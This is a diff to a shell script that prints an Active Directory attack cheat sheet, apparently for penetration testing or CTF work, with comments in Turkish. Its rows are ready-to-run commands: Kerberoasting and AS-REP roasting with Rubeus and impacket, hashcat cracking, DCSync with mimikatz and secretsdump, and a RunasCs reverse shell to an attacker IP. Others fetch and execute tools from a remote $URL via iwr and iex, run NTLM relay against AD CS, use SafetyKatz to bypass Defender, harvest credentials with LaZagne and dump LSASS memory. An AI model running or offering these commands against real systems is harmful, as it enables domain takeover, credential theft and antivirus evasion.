@@ -105,18 +105,38 @@ if [ "$COMPACT" -eq 1 ]; then
     row "kerbrute"   "/tmp/kb userenum --dc <DC> -d <DOMAIN> users.txt   ${DIM}# wget $URL/ad/kerbrute_linux -O /tmp/kb${NC}"
     row "enum4lin"   "python3 $URL/enum/enum4linux-ng.py -A <target>   ${DIM}# Kali'de calistir${NC}"
 
-    sec "[5b] AD ATTACK  (kerberoast / asreproast / coercion)"
-    row "rubeus-kr"  "iwr $URL/ad/Rubeus.exe -o \$env:TEMP\\r.exe; & \$env:TEMP\\r.exe kerberoast /outfile:hashes.txt"
-    row "rubeus-as"  "& \$env:TEMP\\r.exe asreproast /format:hashcat /outfile:asrep.txt"
-    row "petitpotam" "wget $URL/ad/PetitPotam.py -O /tmp/pp.py && python3 /tmp/pp.py $IP <DC>"
-    row "certify"    "iwr $URL/ad/Certify.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe find /vulnerable"
+    sec "[5b] AD ATTACK - Kerberoast  (SPN'li service account'larin TGS hash'i)"
+    row "rubeus"     "iwr $URL/ad/Rubeus.exe -o \$env:TEMP\\r.exe; & \$env:TEMP\\r.exe kerberoast /outfile:hashes.txt /nowrap"
+    row "impacket"   "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request -outputfile hashes.txt   ${DIM}# Kali'de${NC}"
+    row "crack"      "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
 
-    sec "[5c] CREDENTIAL DUMP"
+    sec "[5c] AD ATTACK - AS-REPRoast  (DONT_REQ_PREAUTH ozelligi olan user'lar)"
+    row "rubeus"     "& \$env:TEMP\\r.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap"
+    row "impacket"   "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt   ${DIM}# Kali, kimliksiz${NC}"
+    row "crack"      "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
+
+    sec "[5d] AD ATTACK - DCSync  (DA/Replication hakki olunca tum domain hash'leri)"
+    row "mimikatz"   "lsadump::dcsync /domain:<DOMAIN> /user:Administrator   ${DIM}# mimikatz icinde${NC}"
+    row "mimi-all"   "lsadump::dcsync /domain:<DOMAIN> /all /csv"
+    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali, dahili DCSync${NC}"
+    row "just-dc"    "impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# sadece NTDS (sessiz)${NC}"
+
+    sec "[5e] AD ATTACK - RunasCs  (cred bul → o user olarak komut calistir, lateral)"
+    row "runas-exe"  "iwr $URL/windows/RunasCs.exe -o \$env:TEMP\\rc.exe; & \$env:TEMP\\rc.exe <USER> <PASS> 'cmd.exe /c whoami'"
+    row "runas-rev"  "& \$env:TEMP\\rc.exe <USER> <PASS> -r $IP:4445   ${DIM}# direkt revshell, listener ac${NC}"
+    row "runas-ps1"  "iex (iwr $URL/windows/Invoke-RunasCs.ps1 -UB).Content; Invoke-RunasCs <USER> <PASS> 'whoami'"
+
+    sec "[5f] AD ATTACK - Coercion + AD CS"
+    row "petitpotam" "python3 /tmp/pp.py $IP <DC>   ${DIM}# DC'yi NTLM authenticate ettir → Responder/ntlmrelay${NC}"
+    row "certify"    "iwr $URL/ad/Certify.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe find /vulnerable"
+    row "ntlmrelay"  "impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+
+    sec "[5g] CREDENTIAL DUMP"
     row "mimikatz"   "iwr $URL/ad/mimikatz_trunk.zip -o m.zip; Expand-Archive m.zip; .\\m\\x64\\mimikatz.exe   ${DIM}# privilege::debug; sekurlsa::logonpasswords${NC}"
-    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender'a karsi yumusatilmis mimikatz${NC}"
-    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB cred'leri${NC}"
-    row "lazagne-l"  "wget $URL/linux/laZagne.py -O /tmp/lz.py && python3 /tmp/lz.py all   ${DIM}# python3 + pip dependencies hedef'te${NC}"
-    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali'de, SAM/NTDS dump${NC}"
+    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender bypass mimikatz${NC}"
+    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB${NC}"
+    row "lazagne-l"  "wget $URL/linux/laZagne.py -O /tmp/lz.py && python3 /tmp/lz.py all"
+    row "comsvcs"    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \$env:TEMP\\l.dmp full   ${DIM}# LSASS dump (admin)${NC}"
 
     # =========================================================
     # PHASE 6 - LATERAL MOVEMENT / TRANSFER
